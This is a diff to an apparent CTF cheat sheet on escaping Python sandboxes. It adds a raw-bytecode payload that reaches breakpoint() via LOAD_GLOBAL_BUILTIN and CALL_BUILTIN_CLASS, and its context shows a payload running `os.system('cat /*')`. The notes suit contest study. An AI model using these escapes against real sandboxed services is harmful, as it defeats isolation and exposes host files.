@@ -332,3 +332,22 @@ payload = co_code.ljust(176, b"B") # add padding util the input limit is reached
 print(payload.hex().encode() + b" if __import__('os').system('cat /*') else 0")
 
 ```
+
+### No CALL or LOAD_GLOBAL using LOAD_GLOBAL_BUILTIN and CALL_BUILTIN_CLASS
+From [Pycjail returns - ångstromCTF 2024](https://angstromctf.com/)
+The idea is to call the breakpoint() function using `LOAD_GLOBAL_BUILTIN` and `CALL_BUILTIN_CLASS`
+To avoid causing a segfault when calling breakpoint, we can purposely throw an exception by using, for example, `UNPACK_SEQUENCE_LIST` (using an unknown opcode works too)
+```py
+from opcode import opmap
+
+code = bytes([
+    111, 1, # LOAD_GLOBAL_BUILTIN
+    6,6,6,6,6,6,6,6, # trash
+    29, 0, # CALL_BUILTIN_CLASS
+    6,6,6,6,6,6, # other trash
+    191,0 # unknown opcode -> error
+])
+
+
+print(code.hex())
+```
